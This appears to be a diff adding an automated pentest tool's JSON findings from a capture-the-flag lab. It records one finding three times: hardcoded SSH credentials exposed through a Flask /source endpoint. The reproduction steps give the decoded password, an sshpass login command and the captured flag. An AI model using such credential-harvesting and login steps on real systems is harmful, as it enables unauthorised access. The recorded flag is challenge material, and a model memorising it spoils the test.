@@ -1,0 +1,57 @@
+{
+  "meta": {
+    "created": "2026-04-15T07:33:24.256003+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "bf80e8d9-68a5-49ef-a399-1642e65c7a7d",
+      "timestamp": "2026-04-15T07:33:24.255896+00:00",
+      "title": "Hardcoded SSH Credentials in Flask Application Source Code",
+      "severity": "critical",
+      "target": "http://172.17.0.1:55611",
+      "description": "The Flask application exposes its source code via /source endpoint, revealing hardcoded SSH credentials (username: pedro, password: base64 encoded 'AHeavySandbag' + '!'). The SSH server on port 55612 accepts password authentication, allowing full access to the container.",
+      "evidence": "flag{8967fc4b-578f-4b9f-952e-26eb7fb2e909}",
+      "tool_used": "source_code_analysis",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "1. Access http://172.17.0.1:55611/source to view source code\n2. Decode base64 password: echo 'QUhlYXZ5U2FuZGJhZw==' | base64 -d \u2192 'AHeavySandbag'\n3. Add '!' suffix: password = 'AHeavySandbag!'\n4. SSH to port 55612: sshpass -p 'AHeavySandbag!' ssh pedro@172.17.0.1 -p 55612\n5. Read flag: cat /home/pedro/FLAG.txt",
+        "expected": "flag{8967fc4b-578f-4b9f-952e-26eb7fb2e909}"
+      }
+    },
+    {
+      "id": "7941dfe5-c6f0-4e84-9463-986264172d72",
+      "timestamp": "2026-04-15T07:33:24.265119+00:00",
+      "title": "Hardcoded SSH Credentials in Flask Application Source Code",
+      "severity": "critical",
+      "target": "http://172.17.0.1:55611",
+      "description": "The Flask application exposes its source code via /source endpoint, revealing hardcoded SSH credentials (username: pedro, password: base64 encoded 'AHeavySandbag' + '!'). The SSH server on port 55612 accepts password authentication, allowing full access to the container.",
+      "evidence": "flag{8967fc4b-578f-4b9f-952e-26eb7fb2e909}",
+      "tool_used": "source_code_analysis",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "1. Access http://172.17.0.1:55611/source to view source code\n2. Decode base64 password: echo 'QUhlYXZ5U2FuZGJhZw==' | base64 -d \u2192 'AHeavySandbag'\n3. Add '!' suffix: password = 'AHeavySandbag!'\n4. SSH to port 55612: sshpass -p 'AHeavySandbag!' ssh pedro@172.17.0.1 -p 55612\n5. Read flag: cat /home/pedro/FLAG.txt",
+        "expected": "flag{8967fc4b-578f-4b9f-952e-26eb7fb2e909}"
+      }
+    },
+    {
+      "id": "806d8452-a14f-43fa-b111-aa40a0216ae9",
+      "timestamp": "2026-04-15T07:33:24.273468+00:00",
+      "title": "Hardcoded SSH Credentials in Flask Application Source Code",
+      "severity": "critical",
+      "target": "http://172.17.0.1:55611",
+      "description": "The Flask application exposes its source code via /source endpoint, revealing hardcoded SSH credentials (username: pedro, password: base64 encoded 'AHeavySandbag' + '!'). The SSH server on port 55612 accepts password authentication, allowing full access to the container.",
+      "evidence": "flag{8967fc4b-578f-4b9f-952e-26eb7fb2e909}",
+      "tool_used": "source_code_analysis",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "1. Access http://172.17.0.1:55611/source to view source code\n2. Decode base64 password: echo 'QUhlYXZ5U2FuZGJhZw==' | base64 -d \u2192 'AHeavySandbag'\n3. Add '!' suffix: password = 'AHeavySandbag!'\n4. SSH to port 55612: sshpass -p 'AHeavySandbag!' ssh pedro@172.17.0.1 -p 55612\n5. Read flag: cat /home/pedro/FLAG.txt",
+        "expected": "flag{8967fc4b-578f-4b9f-952e-26eb7fb2e909}"
+      }
+    }
+  ],
+  "diagrams": []
+}
